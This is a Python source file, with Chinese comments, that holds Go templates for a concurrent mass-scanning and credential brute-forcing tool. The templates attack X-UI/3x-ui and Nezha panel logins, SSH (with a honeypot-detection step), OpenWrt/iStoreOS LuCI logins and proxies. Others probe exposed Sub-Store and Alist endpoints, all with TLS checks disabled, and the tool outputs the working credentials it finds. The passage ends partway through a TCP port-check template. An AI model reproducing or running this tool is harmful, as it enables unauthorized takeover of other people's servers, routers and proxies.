# -*- coding: utf-8 -*-
import os
import subprocess
import time
import shutil
import sys
import atexit
import re
import json
import base64
import binascii
import importlib.util # 修复导入错误所需
import uuid # 为并发扩展扫描生成唯一ID
import itertools # 用于流式读取文件
from threading import Lock
from concurrent.futures import ProcessPoolExecutor, as_completed

# ==================== 依赖导入强化 ====================
# 在脚本最开始就强制检查核心依赖，如果失败则直接退出
try:
    import psutil
    import requests
    import yaml
    from openpyxl import Workbook, load_workbook
    from tqdm import tqdm
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError as e:
    print("❌ 错误：核心 Python 模块缺失！")
    print("缺失的模块是: {}".format(e.name))
    print("请先手动安装所有依赖：")
    print("python3 -m pip install psutil requests pyyaml openpyxl tqdm colorama --break-system-packages")
    sys.exit(1)

try:
    import readline
except ImportError:
    pass
# =================================================

# ==================== 新增全局变量 ====================
TIMEOUT = 5
VERBOSE_DEBUG = False # 设置为True可以打印更详细的调试日志

# =========================== Go 模板（已重构以使用 Stdin/Stdout 和优化性能） ===========================

# XUI/3x-ui 面板登录模板
XUI_GO_TEMPLATE_1_LINES = [
    "package main",
    "import (",
    "	\"bufio\"",
    "	\"context\"",
    "	\"crypto/tls\"",
    "	\"encoding/json\"",
    "	\"fmt\"",
    "	\"io\"",
    "	\"net/http\"",
    "	\"net/url\"",
    "	\"os\"",
    "	\"strings\"",
    "	\"sync\"",
    "	\"time\"",
    ")",
    "func worker(tasks <-chan string, results chan<- string, wg *sync.WaitGroup, usernames []string, passwords []string) {",
    "	defer wg.Done()",
    "	tr := &http.Transport{",
    "		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},",
    "		DisableKeepAlives:   false, ",
    "		MaxIdleConnsPerHost: 100,",
    "	}",
    "	httpClient := &http.Client{ Transport: tr, Timeout: {timeout} * time.Second }",
    "	var urlBuilder strings.Builder",
    "	for line := range tasks {",
    "		processIP(line, results, usernames, passwords, httpClient, &urlBuilder)",
    "	}",
    "}",
    "func processIP(line string, results chan<- string, usernames []string, passwords []string, httpClient *http.Client, urlBuilder *strings.Builder) {",
    "	var ipPort string",
    "	u, err := url.Parse(strings.TrimSpace(line))",
    "	if err == nil && u.Host != \"\" { ipPort = u.Host } else { ipPort = strings.TrimSpace(line) }",
    "	parts := strings.Split(ipPort, \":\")",
    "	if len(parts) != 2 { return }",
    "	ip, port := parts[0], parts[1]",
    "	for _, username := range usernames {",
    "		for _, password := range passwords {",
    "			var resp *http.Response",
    "			var err error",
    "			payload := fmt.Sprintf(\"username=%s&password=%s\", username, password)",
    "			ctx, cancel := context.WithTimeout(context.Background(), {timeout}*time.Second)",
    "			// 1. Try HTTP",
    "			urlBuilder.Reset()",
    "			urlBuilder.WriteString(\"http://\")",
    "			urlBuilder.WriteString(ipPort)",
    "			urlBuilder.WriteString(\"/login\")",
    "			checkURLHttp := urlBuilder.String()",
    "			reqHttp, _ := http.NewRequestWithContext(ctx, \"POST\", checkURLHttp, strings.NewReader(payload))",
    "			reqHttp.Header.Add(\"Content-Type\", \"application/x-www-form-urlencoded\")",
    "			resp, err = httpClient.Do(reqHttp)",
    "			cancel()",
    "			// 2. If HTTP fails, try HTTPS",
    "			if err != nil {",
    "				if resp != nil { resp.Body.Close() }",
    "				ctx2, cancel2 := context.WithTimeout(context.Background(), {timeout}*time.Second)",
    "				urlBuilder.Reset()",
    "				urlBuilder.WriteString(\"https://\")",
    "				urlBuilder.WriteString(ipPort)",
    "				urlBuilder.WriteString(\"/login\")",
    "				checkURLHttps := urlBuilder.String()",
    "				reqHttps, _ := http.NewRequestWithContext(ctx2, \"POST\", checkURLHttps, strings.NewReader(payload))",
    "				reqHttps.Header.Add(\"Content-Type\", \"application/x-www-form-urlencoded\")",
    "				resp, err = httpClient.Do(reqHttps)",
    "				cancel2()",
    "			}",
    "			if err != nil {",
    "				if resp != nil { resp.Body.Close() }",
    "				continue",
    "			}",
    "			if resp.StatusCode == http.StatusOK {",
    "				body, readErr := io.ReadAll(resp.Body)",
    "				if readErr == nil {",
    "					var responseData map[string]interface{}",
    "					if json.Unmarshal(body, &responseData) == nil {",
    "						if success, ok := responseData[\"success\"].(bool); ok && success {",
    "							results <- fmt.Sprintf(\"%s %s %s\", ipPort, username, password)",
    "							resp.Body.Close()",
    "							return",
    "						}",
    "					}",
    "				}",
    "			}",
    "			io.Copy(io.Discard, resp.Body)",
    "			resp.Body.Close()",
    "		}",
    "	}",
    "}",
    "func main() {",
    "	usernames, passwords := {user_list}, {pass_list}",
    "	tasks := make(chan string, {semaphore_size})",
    "	results := make(chan string, {semaphore_size})",
    "	var wg sync.WaitGroup",
    "	// Writer goroutine",
    "	go func() {",
    "		writer := bufio.NewWriter(os.Stdout)",
    "		for res := range results {",
    "			writer.WriteString(res + \"\\n\")",
    "		}",
    "		writer.Flush()",
    "	}()",
    "	// Worker goroutines",
    "	for i := 0; i < {semaphore_size}; i++ {",
    "		wg.Add(1)",
    "		go worker(tasks, results, &wg, usernames, passwords)",
    "	}",
    "	// Read from stdin and dispatch tasks",
    "	scanner := bufio.NewScanner(os.Stdin)",
    "	for scanner.Scan() {",
    "		line := strings.TrimSpace(scanner.Text())",
    "		if line != \"\" { tasks <- line }",
    "	}",
    "	close(tasks)",
    "	wg.Wait()",
    "	close(results)",
    "}",
]

# 哪吒面板登录模板
XUI_GO_TEMPLATE_2_LINES = [
    "package main",
    "import (",
    "	\"bufio\"",
    "	\"context\"",
    "	\"crypto/tls\"",
    "	\"encoding/json\"",
    "	\"fmt\"",
    "	\"io\"",
    "	\"net/http\"",
    "	\"net/url\"",
    "	\"os\"",
    "	\"strings\"",
    "	\"sync\"",
    "	\"time\"",
    ")",
    "func worker(tasks <-chan string, results chan<- string, wg *sync.WaitGroup, usernames []string, passwords []string) {",
    "	defer wg.Done()",
    "	tr := &http.Transport{",
    "		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},",
    "		DisableKeepAlives:   false,",
    "		MaxIdleConnsPerHost: 100,",
    "	}",
    "	httpClient := &http.Client{ Transport: tr, Timeout: {timeout} * time.Second }",
    "	var urlBuilder strings.Builder",
    "	for line := range tasks {",
    "		processIP(line, results, usernames, passwords, httpClient, &urlBuilder)",
    "	}",
    "}",
    "func processIP(line string, results chan<- string, usernames []string, passwords []string, httpClient *http.Client, urlBuilder *strings.Builder) {",
    "	var ipPort string",
    "	u, err := url.Parse(strings.TrimSpace(line))",
    "	if err == nil && u.Host != \"\" { ipPort = u.Host } else { ipPort = strings.TrimSpace(line) }",
    "	parts := strings.Split(ipPort, \":\")",
    "	if len(parts) != 2 { return }",
    "	for _, username := range usernames {",
    "		for _, password := range passwords {",
    "			var resp *http.Response",
    "			var err error",
    "			data := map[string]string{\"username\": username, \"password\": password}",
    "			jsonPayload, _ := json.Marshal(data)",
    "			ctx, cancel := context.WithTimeout(context.Background(), {timeout}*time.Second)",
    "			// 1. Try HTTP",
    "			urlBuilder.Reset()",
    "			urlBuilder.WriteString(\"http://\")",
    "			urlBuilder.WriteString(ipPort)",
    "			urlBuilder.WriteString(\"/api/v1/login\")",
    "			checkURLHttp := urlBuilder.String()",
    "			reqHttp, _ := http.NewRequestWithContext(ctx, \"POST\", checkURLHttp, strings.NewReader(string(jsonPayload)))",
    "			reqHttp.Header.Set(\"Content-Type\", \"application/json\")",
    "			resp, err = httpClient.Do(reqHttp)",
    "			cancel()",
    "			// 2. If HTTP fails, try HTTPS",
    "			if err != nil {",
    "				if resp != nil { resp.Body.Close() }",
    "				ctx2, cancel2 := context.WithTimeout(context.Background(), {timeout}*time.Second)",
    "				urlBuilder.Reset()",
    "				urlBuilder.WriteString(\"https://\")",
    "				urlBuilder.WriteString(ipPort)",
    "				urlBuilder.WriteString(\"/api/v1/login\")",
    "				checkURLHttps := urlBuilder.String()",
    "				reqHttps, _ := http.NewRequestWithContext(ctx2, \"POST\", checkURLHttps, strings.NewReader(string(jsonPayload)))",
    "				reqHttps.Header.Set(\"Content-Type\", \"application/json\")",
    "				resp, err = httpClient.Do(reqHttps)",
    "				cancel2()",
    "			}",
    "			if err != nil {",
    "				if resp != nil { resp.Body.Close() }",
    "				continue",
    "			}",
    "			if resp.StatusCode == http.StatusOK {",
    "				body, readErr := io.ReadAll(resp.Body)",
    "				if readErr == nil {",
    "					var responseData map[string]interface{}",
    "					if json.Unmarshal(body, &responseData) == nil {",
    "						if data, ok := responseData[\"data\"].(map[string]interface{}); ok {",
    "							if _, tokenExists := data[\"token\"]; tokenExists {",
    "								results <- fmt.Sprintf(\"%s %s %s\", ipPort, username, password)",
    "								resp.Body.Close()",
    "								return",
    "							}",
    "						}",
    "					}",
    "				}",
    "			}",
    "			io.Copy(io.Discard, resp.Body)",
    "			resp.Body.Close()",
    "		}",
    "	}",
    "}",
    "func main() {",
    "	usernames, passwords := {user_list}, {pass_list}",
    "	tasks := make(chan string, {semaphore_size})",
    "	results := make(chan string, {semaphore_size})",
    "	var wg sync.WaitGroup",
    "	go func() {",
    "		writer := bufio.NewWriter(os.Stdout)",
    "		for res := range results { writer.WriteString(res + \"\\n\") }",
    "		writer.Flush()",
    "	}()",
    "	for i := 0; i < {semaphore_size}; i++ {",
    "		wg.Add(1)",
    "		go worker(tasks, results, &wg, usernames, passwords)",
    "	}",
    "	scanner := bufio.NewScanner(os.Stdin)",
    "	for scanner.Scan() {",
    "		line := strings.TrimSpace(scanner.Text())",
    "		if line != \"\" { tasks <- line }",
    "	}",
    "	close(tasks)",
    "	wg.Wait()",
    "	close(results)",
    "}",
]

# SSH 登录模板
XUI_GO_TEMPLATE_6_LINES = [
    "package main",
    "import (",
    "	\"bufio\"",
    "	\"fmt\"",
    "	\"log\"",
    "	\"net/url\"",
    "	\"os\"",
    "	\"strings\"",
    "	\"sync\"",
    "	\"time\"",
    "	\"golang.org/x/crypto/ssh\"",
    ")",
    "func worker(tasks <-chan string, results chan<- string, wg *sync.WaitGroup, usernames []string, passwords []string) {",
    "	defer wg.Done()",
    "	for line := range tasks {",
    "		processIP(line, results, usernames, passwords)",
    "	}",
    "}",
    "func processIP(line string, results chan<- string, usernames []string, passwords []string) {",
    "	var ipPort string",
    "	u, err := url.Parse(strings.TrimSpace(line))",
    "	if err == nil && u.Host != \"\" { ipPort = u.Host } else { ipPort = strings.TrimSpace(line) }",
    "	parts := strings.Split(ipPort, \":\")",
    "	if len(parts) != 2 { return }",
    "	ip, port := strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1])",
    "	for _, username := range usernames {",
    "		for _, password := range passwords {",
    "			client, success, _ := trySSH(ip, port, username, password)",
    "			if success {",
    "				if !isLikelyHoneypot(client) {",
    "					results <- fmt.Sprintf(\"%s:%s %s %s\", ip, port, username, password)",
    "				}",
    "				client.Close()",
    "				return",
    "			}",
    "		}",
    "	}",
    "}",
    "func trySSH(ip, port, username, password string) (*ssh.Client, bool, error) {",
    "	addr := fmt.Sprintf(\"%s:%s\", ip, port)",
    "	config := &ssh.ClientConfig{",
    "		User:            username,",
    "		Auth:            []ssh.AuthMethod{ssh.Password(password)},",
    "		HostKeyCallback: ssh.InsecureIgnoreHostKey(),",
    "		Timeout:         {timeout} * time.Second,",
    "	}",
    "	client, err := ssh.Dial(\"tcp\", addr, config)",
    "	return client, err == nil, err",
    "}",
    "func isLikelyHoneypot(client *ssh.Client) bool {",
    "	session, err := client.NewSession()",
    "	if err != nil { return true }",
    "	defer session.Close()",
    "	err = session.RequestPty(\"xterm\", 80, 40, ssh.TerminalModes{})",
    "	if err != nil { return true }",
    "	output, err := session.CombinedOutput(\"echo $((1+1))\")",
    "	if err != nil { return true }",
    "	return strings.TrimSpace(string(output)) != \"2\"",
    "}",
    "func main() {",
    "	log.SetOutput(os.Stderr) // Redirect logs to stderr to not interfere with stdout results",
    "	usernames, passwords := {user_list}, {pass_list}",
    "	tasks := make(chan string, {semaphore_size})",
    "	results := make(chan string, {semaphore_size})",
    "	var wg sync.WaitGroup",
    "	go func() {",
    "		writer := bufio.NewWriter(os.Stdout)",
    "		for res := range results { writer.WriteString(res + \"\\n\") }",
    "		writer.Flush()",
    "	}()",
    "	for i := 0; i < {semaphore_size}; i++ {",
    "		wg.Add(1)",
    "		go worker(tasks, results, &wg, usernames, passwords)",
    "	}",
    "	scanner := bufio.NewScanner(os.Stdin)",
    "	for scanner.Scan() {",
    "		line := strings.TrimSpace(scanner.Text())",
    "		if line != \"\" { tasks <- line }",
    "	}",
    "	close(tasks)",
    "	wg.Wait()",
    "	close(results)",
    "}",
]

# Sub Store 路径扫描模板
XUI_GO_TEMPLATE_7_LINES = [
    "package main",
    "import (",
    "	\"bufio\"",
    "	\"context\"",
    "	\"crypto/tls\"",
    "	\"fmt\"",
    "	\"io\"",
    "	\"net/http\"",
    "	\"net/url\"",
    "	\"os\"",
    "	\"strings\"",
    "	\"sync\"",
    "	\"time\"",
    ")",
    "func worker(tasks <-chan string, results chan<- string, wg *sync.WaitGroup, paths []string) {",
    "	defer wg.Done()",
    "	tr := &http.Transport{",
    "		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},",
    "		DisableKeepAlives:   false,",
    "		MaxIdleConnsPerHost: 100,",
    "	}",
    "	client := &http.Client{ Transport: tr, Timeout: {timeout} * time.Second }",
    "	var urlBuilder strings.Builder",
    "	for line := range tasks {",
    "		processIP(line, results, paths, client, &urlBuilder)",
    "	}",
    "}",
    "func processIP(line string, results chan<- string, paths []string, client *http.Client, urlBuilder *strings.Builder) {",
    "	var ipPort string",
    "	u, err := url.Parse(strings.TrimSpace(line))",
    "	if err == nil && u.Host != \"\" { ipPort = u.Host } else { ipPort = strings.TrimSpace(line) }",
    "	for _, path := range paths {",
    "		if tryBothProtocols(ipPort, path, client, results, urlBuilder) { break }",
    "	}",
    "}",
    "func tryBothProtocols(ipPort string, path string, client *http.Client, results chan<- string, urlBuilder *strings.Builder) bool {",
    "	cleanPath := strings.Trim(path, \"/\")",
    "	urlBuilder.Reset()",
    "	urlBuilder.WriteString(cleanPath)",
    "	urlBuilder.WriteString(\"/api/utils/env\")",
    "	apiPath := urlBuilder.String()",
    "	// Try HTTP",
    "	if success, _ := sendRequest(client, fmt.Sprintf(\"http://%s/%s\", ipPort, apiPath)); success {",
    "		results <- fmt.Sprintf(\"http://%s?api=http://%s/%s\", ipPort, ipPort, cleanPath)",
    "		return true",
    "	}",
    "	// Try HTTPS",
    "	if success, _ := sendRequest(client, fmt.Sprintf(\"https://%s/%s\", ipPort, apiPath)); success {",
    "		results <- fmt.Sprintf(\"https://%s?api=https://%s/%s\", ipPort, ipPort, cleanPath)",
    "		return true",
    "	}",
    "	return false",
    "}",
    "func sendRequest(client *http.Client, fullURL string) (bool, error) {",
    "	ctx, cancel := context.WithTimeout(context.Background(), {timeout}*time.Second)",
    "	defer cancel()",
    "	req, err := http.NewRequestWithContext(ctx, \"GET\", fullURL, nil)",
    "	if err != nil { return false, err }",
    "	resp, err := client.Do(req)",
    "	if err != nil {",
    "		if resp != nil { resp.Body.Close() }",
    "		return false, err",
    "	}",
    "	defer resp.Body.Close()",
    "	if resp.StatusCode == http.StatusOK {",
    "		bodyBytes, readErr := io.ReadAll(resp.Body)",
    "		if readErr != nil { return false, readErr }",
    "		if strings.Contains(string(bodyBytes), `{\"status\":\"success\",\"data\"`) {",
    "			return true, nil",
    "		}",
    "	}",
    "	io.Copy(io.Discard, resp.Body)",
    "	return false, nil",
    "}",
    "func main() {",
    "	paths := {pass_list}",
    "	tasks := make(chan string, {semaphore_size})",
    "	results := make(chan string, {semaphore_size})",
    "	var wg sync.WaitGroup",
    "	go func() {",
    "		writer := bufio.NewWriter(os.Stdout)",
    "		for res := range results { writer.WriteString(res + \"\\n\") }",
    "		writer.Flush()",
    "	}()",
    "	for i := 0; i < {semaphore_size}; i++ {",
    "		wg.Add(1)",
    "		go worker(tasks, results, &wg, paths)",
    "	}",
    "	scanner := bufio.NewScanner(os.Stdin)",
    "	for scanner.Scan() {",
    "		line := strings.TrimSpace(scanner.Text())",
    "		if line != \"\" { tasks <- line }",
    "	}",
    "	close(tasks)",
    "	wg.Wait()",
    "	close(results)",
    "}",
]

# OpenWrt/iStoreOS 登录模板
XUI_GO_TEMPLATE_8_LINES = [
    "package main",
    "import (",
    "	\"bufio\"",
    "	\"context\"",
    "	\"crypto/tls\"",
    "	\"fmt\"",
    "	\"io\"",
    "	\"net/http\"",
    "	\"net/url\"",
    "	\"os\"",
    "	\"strings\"",
    "	\"sync\"",
    "	\"time\"",
    ")",
    "func worker(tasks <-chan string, results chan<- string, wg *sync.WaitGroup, usernames []string, passwords []string) {",
    "	defer wg.Done()",
    "	tr := &http.Transport{",
    "		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},",
    "		DisableKeepAlives:   false,",
    "		MaxIdleConnsPerHost: 100,",
    "	}",
    "	client := &http.Client{",
    "		Transport: tr,",
    "		Timeout:   {timeout} * time.Second,",
    "		CheckRedirect: func(req *http.Request, via []*http.Request) error {",
    "			return http.ErrUseLastResponse",
    "		},",
    "	}",
    "	for line := range tasks {",
    "		processIP(line, results, usernames, passwords, client)",
    "	}",
    "}",
    "func processIP(line string, results chan<- string, usernames []string, passwords []string, client *http.Client) {",
    "	targets := []string{}",
    "	trimmed := strings.TrimSpace(line)",
    "	if strings.HasPrefix(trimmed, \"http\") {",
    "		targets = append(targets, trimmed)",
    "	} else {",
    "		targets = append(targets, \"http://\"+trimmed, \"https://\"+trimmed)",
    "	}",
    "	for _, target := range targets {",
    "		u, err := url.Parse(target)",
    "		if err != nil { continue }",
    "		origin := u.Scheme + \"://\" + u.Host",
    "		referer := origin + \"/\"",
    "		for _, username := range usernames {",
    "			for _, password := range passwords {",
    "				if checkLogin(target, username, password, origin, referer, client) {",
    "					results <- fmt.Sprintf(\"%s %s %s\", target, username, password)",
    "					return",
    "				}",
    "			}",
    "		}",
    "	}",
    "}",
    "func checkLogin(urlStr, username, password, origin, referer string, client *http.Client) bool {",
    "	ctx, cancel := context.WithTimeout(context.Background(), {timeout}*time.Second)",
    "	defer cancel()",
    "	payload := fmt.Sprintf(\"luci_username=%s&luci_password=%s\", username, password)",
    "	req, err := http.NewRequestWithContext(ctx, \"POST\", urlStr, strings.NewReader(payload))",
    "	if err != nil { return false }",
    "	req.Header.Set(\"Content-Type\", \"application/x-www-form-urlencoded\")",
    "	req.Header.Set(\"Origin\", origin)",
    "	req.Header.Set(\"Referer\", referer)",
    "	resp, err := client.Do(req)",
    "	if err != nil {",
    "		if resp != nil { resp.Body.Close() }",
    "		return false",
    "	}",
    "	defer resp.Body.Close()",
    "	io.Copy(io.Discard, resp.Body)",
    "	for _, c := range resp.Cookies() {",
    "		if c.Name == \"sysauth_http\" && c.Value != \"\" {",
    "			return true",
    "		}",
    "	}",
    "	return false",
    "}",
    "func main() {",
    "	usernames, passwords := {user_list}, {pass_list}",
    "	tasks := make(chan string, {semaphore_size})",
    "	results := make(chan string, {semaphore_size})",
    "	var wg sync.WaitGroup",
    "	go func() {",
    "		writer := bufio.NewWriter(os.Stdout)",
    "		for res := range results { writer.WriteString(res + \"\\n\") }",
    "		writer.Flush()",
    "	}()",
    "	for i := 0; i < {semaphore_size}; i++ {",
    "		wg.Add(1)",
    "		go worker(tasks, results, &wg, usernames, passwords)",
    "	}",
    "	scanner := bufio.NewScanner(os.Stdin)",
    "	for scanner.Scan() {",
    "		line := strings.TrimSpace(scanner.Text())",
    "		if line != \"\" { tasks <- line }",
    "	}",
    "	close(tasks)",
    "	wg.Wait()",
    "	close(results)",
    "}",
]

# ==================== 代理模板修复 ====================
# 通用代理验证模板（支持SOCKS5, HTTP, HTTPS）
PROXY_GO_TEMPLATE_LINES = [
    "package main",
    "import (",
    "	\"bufio\"",
    "	\"context\"",
    "	\"crypto/tls\"",
    "	\"fmt\"",
    "	\"io/ioutil\"",
    "	\"net\"",
    "	\"net/http\"",
    "	\"net/url\"",
    "	\"os\"",
    "	\"strings\"",
    "	\"sync\"",
    "	\"time\"",
    "	\"golang.org/x/net/proxy\"",
    ")",
    "var (",
    "	proxyType    = \"{proxy_type}\"",
    "	authMode     = {auth_mode}",
    "	testURL      = \"http://myip.ipip.net\"",
    "	realIP       = \"\"",
    ")",
    "func worker(tasks <-chan string, results chan<- string, wg *sync.WaitGroup) {",
    "	defer wg.Done()",
    "	for proxyAddr := range tasks {",
    "		processProxy(proxyAddr, results)",
    "	}",
    "}",
    "func processProxy(proxyAddr string, results chan<- string) {",
    "	var found bool",
    "	checkAndFormat := func(auth *proxy.Auth) {",
    "		if found { return }",
    "		success, _ := checkConnection(proxyAddr, auth)",
    "		if success {",
    "			found = true",
    "			var result string",
    "			if auth != nil && auth.User != \"\" {",
    "				result = fmt.Sprintf(\"%s://%s:%s@%s\", proxyType, url.QueryEscape(auth.User), url.QueryEscape(auth.Password), proxyAddr)",
    "			} else {",
    "				result = fmt.Sprintf(\"%s://%s\", proxyType, proxyAddr)",
    "			}",
    "			results <- result",
    "		}",
    "	}",
    "	switch authMode {",
    "	case 1:",
    "		checkAndFormat(nil)",
    "	case 2:",
    "		usernames := {user_list}",
    "		passwords := {pass_list}",
    "		for _, user := range usernames {",
    "			for _, pass := range passwords {",
    "				if found { return }",
    "				auth := &proxy.Auth{User: user, Password: pass}",
    "				checkAndFormat(auth)",
    "			}",
    "		}",
    "	case 3:",
    "		credentials := {creds_list}",
    "		for _, cred := range credentials {",
    "			if found { return }",
    "			parts := strings.SplitN(cred, \":\", 2)",
    "			if len(parts) == 2 {",
    "				auth := &proxy.Auth{User: parts[0], Password: parts[1]}",
    "				checkAndFormat(auth)",
    "			}",
    "		}",
    "	}",
    "}",
    "func getPublicIP(targetURL string) (string, error) {",
    "	client := &http.Client{Timeout: 15 * time.Second}",
    "	req, err := http.NewRequest(\"GET\", targetURL, nil)",
    "	if err != nil { return \"\", err }",
    "	req.Header.Set(\"User-Agent\", \"curl/7.79.1\")",
    "	resp, err := client.Do(req)",
    "	if err != nil { return \"\", err }",
    "	defer resp.Body.Close()",
    "	body, err := ioutil.ReadAll(resp.Body)",
    "	if err != nil { return \"\", err }",
    "	ipString := string(body)",
    "	if strings.Contains(ipString, \"当前 IP：\") {",
    "		parts := strings.Split(ipString, \"：\")",
    "		if len(parts) > 1 {",
    "			ipParts := strings.Split(parts[1], \" \")",
    "			return ipParts[0], nil",
    "		}",
    "	}",
    "	return strings.TrimSpace(ipString), nil",
    "}",
    "func checkConnection(proxyAddr string, auth *proxy.Auth) (bool, error) {",
    "	transport := &http.Transport{",
    "		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},",
    "		DisableKeepAlives: true,",
    "	}",
    "	timeout := {timeout} * time.Second",
    "	if proxyType == \"http\" || proxyType == \"https\" {",
    "		var proxyURLString string",
    "		if auth != nil && auth.User != \"\" {",
    "			proxyURLString = fmt.Sprintf(\"%s://%s:%s@%s\", proxyType, url.QueryEscape(auth.User), url.QueryEscape(auth.Password), proxyAddr)",
    "		} else {",
    "			proxyURLString = fmt.Sprintf(\"%s://%s\", proxyType, proxyAddr)",
    "		}",
    "		proxyURL, err := url.Parse(proxyURLString)",
    "		if err != nil { return false, err }",
    "		transport.Proxy = http.ProxyURL(proxyURL)",
    "		if proxyType == \"https\" {",
    "			transport.DialTLSContext = func(ctx context.Context, network, addr string) (net.Conn, error) {",
    "				dialer := &net.Dialer{Timeout: timeout}",
    "				return tls.DialWithDialer(dialer, network, proxyAddr, &tls.Config{InsecureSkipVerify: true})",
    "			}",
    "		}",
    "	} else {",
    "		dialer, err := proxy.SOCKS5(\"tcp\", proxyAddr, auth, &net.Dialer{ Timeout: timeout })",
    "		if err != nil { return false, err }",
    "		transport.DialContext = func(ctx context.Context, network, addr string) (net.Conn, error) {",
    "			return dialer.Dial(network, addr)",
    "		}",
    "	}",
    "	httpClient := &http.Client{ Transport: transport, Timeout: timeout }",
    "	req, err := http.NewRequest(\"GET\", testURL, nil)",
    "	if err != nil { return false, err }",
    "	req.Header.Set(\"User-Agent\", \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36\")",
    "	resp, err := httpClient.Do(req)",
    "	if err != nil {",
    "		if resp != nil { resp.Body.Close() }",
    "		return false, err",
    "	}",
    "	defer resp.Body.Close()",
    "	body, readErr := ioutil.ReadAll(resp.Body)",
    "	if readErr != nil { return false, fmt.Errorf(\"无法读取响应\") }",
    "	proxyIP := string(body)",
    "	if strings.Contains(proxyIP, \"当前 IP：\") {",
    "		parts := strings.Split(proxyIP, \"：\")",
    "		if len(parts) > 1 {",
    "			ipParts := strings.Split(parts[1], \" \")",
    "			proxyIP = ipParts[0]",
    "		}",
    "	}",
    "	proxyIP = strings.TrimSpace(proxyIP)",
    "	if realIP == \"UNKNOWN\" || proxyIP == \"\" { return false, fmt.Errorf(\"无法获取IP验证\") }",
    "	if proxyIP == realIP { return false, fmt.Errorf(\"透明代理\") }",
    "	return true, nil",
    "}",
    "func main() {",
    "	var err error",
    "	realIP, err = getPublicIP(testURL)",
    "	if err != nil { realIP = \"UNKNOWN\" }",
    "	tasks := make(chan string, {semaphore_size})",
    "	results := make(chan string, {semaphore_size})",
    "	var wg sync.WaitGroup",
    "	go func() {",
    "		writer := bufio.NewWriter(os.Stdout)",
    "		for res := range results { writer.WriteString(res + \"\\n\") }",
    "		writer.Flush()",
    "	}()",
    "	for i := 0; i < {semaphore_size}; i++ {",
    "		wg.Add(1)",
    "		go worker(tasks, results, &wg)",
    "	}",
    "	scanner := bufio.NewScanner(os.Stdin)",
    "	for scanner.Scan() {",
    "		proxyAddr := strings.TrimSpace(scanner.Text())",
    "		if proxyAddr != \"\" { tasks <- proxyAddr }",
    "	}",
    "	close(tasks)",
    "	wg.Wait()",
    "	close(results)",
    "}",
]
# Alist 面板扫描模板
ALIST_GO_TEMPLATE_LINES = [
    "package main",
    "import (",
    "	\"bufio\"",
    "	\"context\"",
    "	\"crypto/tls\"",
    "	\"encoding/json\"",
    "	\"fmt\"",
    "	\"io\"",
    "	\"net\"",
    "	\"net/http\"",
    "	\"os\"",
    "	\"strings\"",
    "	\"sync\"",
    "	\"time\"",
    ")",
    "func createHttpClient() *http.Client {",
    "	tr := &http.Transport{",
    "		Proxy: http.ProxyFromEnvironment,",
    "		DialContext: (&net.Dialer{",
    "			Timeout:   {timeout} * time.Second,",
    "			KeepAlive: 30 * time.Second,",
    "		}).DialContext,",
    "		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},",
    "		DisableKeepAlives:   false, ",
    "		MaxIdleConnsPerHost: 100, ",
    "	}",
    "	return &http.Client{ Transport: tr, Timeout: ({timeout} + 1) * time.Second }",
    "}",
    "func worker(tasks <-chan string, results chan<- string, wg *sync.WaitGroup) {",
    "	defer wg.Done()",
    "	httpClient := createHttpClient()",
    "	for ipPort := range tasks {",
    "		processIP(ipPort, results, httpClient)",
    "	}",
    "}",
    "func processIP(ipPort string, results chan<- string, httpClient *http.Client) {",
    "	ipPort = strings.TrimSpace(ipPort)",
    "	fields := strings.Fields(ipPort)",
    "	if len(fields) == 0 { return }",
    "	target := fields[0]",
    "	for _, proto := range []string{\"http\", \"https\"} {",
    "		base := fmt.Sprintf(\"%s://%s\", proto, target)",
    "		testURL := base + \"/api/me\"",
    "		ctx, cancel := context.WithTimeout(context.Background(), ({timeout} + 1) * time.Second)",
    "		req, err := http.NewRequestWithContext(ctx, \"GET\", testURL, nil)",
    "		if err != nil { cancel(); continue }",
    "		req.Header.Set(\"User-Agent\", \"Mozilla/5.0\")",
    "		resp, err := httpClient.Do(req)",
    "		cancel()",
    "		if err != nil {",
    "			if resp != nil { resp.Body.Close() }",
    "			continue",
    "		}",
    "		if isValidResponse(resp) {",
    "			results <- base",
    "			resp.Body.Close()",
    "			return",
    "		}",
    "		resp.Body.Close()",
    "	}",
    "}",
    "func isValidResponse(resp *http.Response) bool {",
    "	if resp == nil { return false }",
    "	body, err := io.ReadAll(io.LimitReader(resp.Body, 256*1024))",
    "	if err != nil { return false }",
    "	var data map[string]interface{}",
    "	if err := json.Unmarshal(body, &data); err != nil { return false }",
    "	if v, ok := data[\"code\"]; ok {",
    "		switch t := v.(type) {",
    "		case float64:",
    "			return int(t) == 200",
    "		case string:",
    "			return t == \"200\"",
    "		}",
    "	}",
    "	return false",
    "}",
    "func main() {",
    "	tasks := make(chan string, {semaphore_size})",
    "	results := make(chan string, {semaphore_size})",
    "	var wg sync.WaitGroup",
    "	go func() {",
    "		writer := bufio.NewWriter(os.Stdout)",
    "		for res := range results { writer.WriteString(res + \"\\n\") }",
    "		writer.Flush()",
    "	}()",
    "	for i := 0; i < {semaphore_size}; i++ {",
    "		wg.Add(1)",
    "		go worker(tasks, results, &wg)",
    "	}",
    "	scanner := bufio.NewScanner(os.Stdin)",
    "	for scanner.Scan() {",
    "		line := strings.TrimSpace(scanner.Text())",
    "		if line != \"\" { tasks <- line }",
    "	}",
    "	close(tasks)",
    "	wg.Wait()",
    "	close(results)",
    "}",
]

# TCP 端口活性测试模板
TCP_ACTIVE_GO_TEMPLATE_LINES = [
    "package main",
    "import (",
    "	\"bufio\"",
    "	\"fmt\"",
    "	\"net\"",
    "	\"os\"",
    "	\"strings\"",
    "	\"sync\"",
    "	\"time\"",
    ")",
    "func worker(tasks <-chan string, results chan<- string, wg *sync.WaitGroup) {",
    "	defer wg.Done()",
    "	for line := range tasks {",
    "		ipPort := strings.TrimSpace(line)",
    "		if _, _, err := net.SplitHostPort(ipPort); err != nil { continue }",
    "		conn, err := net.DialTimeout(\"tcp\", ipPort, {timeout}*time.Second)",
    "		if err == nil {",
    "			conn.Close()",
    "			results <- ipPort",
    "		}",
    "	}",
    "}",
    "func main() {",
    "	tasks := make(chan string, {semaphore_size})",
